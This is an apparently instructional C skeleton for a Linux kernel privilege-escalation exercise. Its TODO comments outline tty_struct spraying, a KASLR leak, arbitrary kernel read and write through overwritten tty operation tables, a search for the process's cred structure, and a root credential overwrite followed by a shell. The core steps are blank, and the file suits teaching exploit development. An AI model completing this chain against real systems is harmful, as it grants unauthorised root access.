#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

#define IS_ERROR(c, s)                                                         \
    {                                                                          \
        if ((c)) {                                                             \
            perror((s));                                                       \
            exit(EXIT_FAILURE);                                                \
        }                                                                      \
    }

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define NUM_TTYS 20

int ttys[NUM_TTYS];

void spray_tty_structs() {
	/* ??? */
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define PTM_UNIX98_OPS_OFFSET /* ??? */

#define MOV_PRDX_ECX_RET (kaslr_base + /* ??? */)
#define MOV_EAX_PRDX_RET (kaslr_base + /* ??? */)

unsigned long kaslr_base, physmap_addr;

int fd, cached_tty_fd;
char buf[0x500];

void exec_shell() {
    char *args[] = { "/bin/sh", "-i", NULL };

    execve("/bin/sh", args, NULL);
}

unsigned int arbitrary_read(unsigned long addr) {
    unsigned long *fake_tty_operations;
    unsigned int read_value;

    if (cached_tty_fd)
        return /* ??? */

    // TODO #4 : Overwrite function table of the target object.
    //           Leverage ioctl() function pointer to invoke MOV_EAX_PRDX_RET.
    /* ??? */

    // TODO #5 : Loop through ttys[] and invoke ioctl() system call.
    //           To prevent extensive reads, store the 'hit' fd in cached_tty_fd.
    /* ??? */

    return read_value;
}

void arbitrary_write(unsigned long addr, unsigned int value) {
    unsigned long *fake_tty_operations;

    // TODO #6 : Overwrite function table of the target object.
    //           Leverage ioctl() function pointer to invoke MOV_PRDX_ECX_RET.
    /* ??? */

    // TODO #7 : Loop through ttys[] and invoke ioctl() system call.
    /* ??? */
}

unsigned long search_current_cred(unsigned long search_addr) {
    unsigned long cred_addr;
    const char *name = "cafebabe";

    // TODO #8 : Set the name of the current thread using prctl().
    //           This will change the comm[] string.
    /* ??? */

    // TODO #9 : Search through the physmap region using arbitrary_read().
    //           Stop when the desired comm[] string is found.
    for (;; search_addr += 8) {
        /* ??? */
    }

    // TODO #10 : Calculate the cred address.
    cred_addr = /* ??? */
    printf("cred_addr : 0x%lx\n", cred_addr);

    return cred_addr;
}

void override_current_cred(unsigned long cred_addr) {
    // TODO #12 : Write to cred address using arbitrary_write().
    /* ??? */
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

int main() {
    // TODO #1 : Allocate g_buf around tty_structs.
    //           Implement spray_tty_structs() first, then use it.
    /* ??? */

    // TODO #2 : Leak KASLR base.
    //           You need to calculate PTM_UNIX98_OPS_OFFSET first.
    /* ??? */
    kaslr_base = /* ??? */
    printf("kaslr_base : 0x%lx\n", kaslr_base);

    // TODO #3 : Leak g_buf address, which is in the physmap region.
    physmap_addr = /* ??? */
    printf("physmap_addr : 0x%lx\n", physmap_addr);

    // TODO #11 : Find the cred address of the current thread.
    //            Implement search_current_cred() first, then use it.
    unsigned long search_addr = /* ??? */
    unsigned long cred_addr = search_current_cred(search_addr);

    // TODO #13 : Override the current cred with root credentials.
    //            Implement override_current_cred() first, then use it.
    override_current_cred(cred_addr);

    exec_shell();

    return 0;
}